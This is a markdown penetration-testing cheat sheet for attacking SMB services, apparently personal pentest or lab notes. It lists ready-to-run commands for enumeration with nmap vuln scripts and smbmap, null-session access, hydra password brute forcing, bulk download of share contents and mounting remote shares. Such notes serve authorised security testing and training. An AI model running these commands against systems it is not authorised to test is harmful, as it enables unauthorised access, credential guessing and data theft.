<h1>Target SMB service</h1> 

**Summery:** 

- [Enumeration](#enumeration)
  - [nmap](#nmap)
  - [nbtscan](#nbtscan)
  - [nmblookup (nbtstat)](#nmblookup-nbtstat)
  - [smbmap](#smbmap)
  - [smbmap](#smbmap-1)
- [Connect](#connect)
- [Brut Force](#brut-force)
  - [hydra](#hydra)
  - [nmap](#nmap-1)
- [Download all the dir](#download-all-the-dir)
- [Mount remote dir](#mount-remote-dir)

## Enumeration

### nmap
    nmap --script smb-vuln* -p 445 <ipAddress>

    nmap -p 139,445 --script vuln -oA nmap-Vuln <ipAddress>

    nmap --script smb-enum-shares -p 139,445 <ipAddress>
    nmap --script=smb-enum* --script-args=unsafe=1 -T5 $ip

### nbtscan
    nbtscan -r <ipAddress>

### nmblookup (nbtstat)
    nmblookup -A <ipAddress>

### smbmap
    
    smbmap -H <ipAddress> -u guest
    smbmap -H <ipAddress> -R -depth 5
-R : recursive + the depth


    


### Smbmap
    cd /usr/share/smbmap
    python2 smbmap.py

## Connect 
Anonymous mount:

    smbclient -L //<ipAddress>
    smbclient \\\\<ipAddress>\\<DIR>

Client mount:

> rpcclient
> 
    rpcclient -U "" -N <ipAddress>
    rpcclient -U "guest" -N <ipAddress>


> rpcinfo
>
    rpcinfo -p <ip>
    nfs-utils

> showmount
> 
    showmount -e <ip>

## Brut Force 
### hydra

    hydra -L user.txt -P pass.txt <ipAddress> smb
### nmap
    nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 <ipAddress>/24


## Download all the dir 
    smbclient \\\\<ipAddress>\\<DIR>
    recurse ON
    prompt OFF
    mget *



## Mount remote dir 
    mkdir /mnt/remoteDir
    mount -t cifs -o user=guest //<ipAddress>/<DIR> /mnt/remoteDir